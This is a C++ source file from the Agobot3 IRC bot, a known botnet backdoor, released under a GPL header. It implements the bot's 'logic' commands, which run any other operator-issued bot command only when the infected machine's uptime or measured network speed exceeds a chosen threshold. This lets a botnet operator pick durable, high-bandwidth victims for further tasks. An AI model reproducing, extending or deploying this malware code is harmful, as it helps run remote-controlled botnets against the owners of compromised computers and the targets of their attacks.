/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "logic.h"

void CLogic::Init()
{
	REGCMD(m_cmdIfUptime,	"logic.ifuptime",	"exec command if uptime is bigger than specified",	false,	this);
	/* scratch scratch. -dj */
	REGCMD(m_cmdIfSpeed,	"logic.ifspeed",	"exec command if speed(via speedtest) is bigger than specified",	false,	this);
 }

bool CLogic::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("logic.ifuptime")) {
		if(!pMsg->sChatString.Token(1, " ").CStr()) return false;
		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iDays) return false;
		if(g_pMainCtrl->m_cBot.UptimeDays()<iDays) return false;

		CString sTemp=pMsg->sChatString.Token(2, " ", true);
		pMsg->sChatString.Assign(sTemp);
		pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
		g_pMainCtrl->m_cBot.HandleMsgInt(pMsg);

		return true; }

	else if(!pMsg->sCmd.Compare("logic.ifspeed"))
	{
		if(!pMsg->sChatString.Token(1, " ").CStr()) return false;
		int i = g_pMainCtrl->m_cStartupThread.m_speedData.lTotalSpeed;
		if(!i) return false;

		if(atoi(pMsg->sChatString.Token(1, " ").CStr())<i)
		{
			CString sTemp=pMsg->sChatString.Token(2, " ", true);
			pMsg->sChatString.Assign(sTemp);
			pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
			g_pMainCtrl->m_cBot.HandleMsgInt(pMsg);
			return true;
		}
	}

	return false;
}
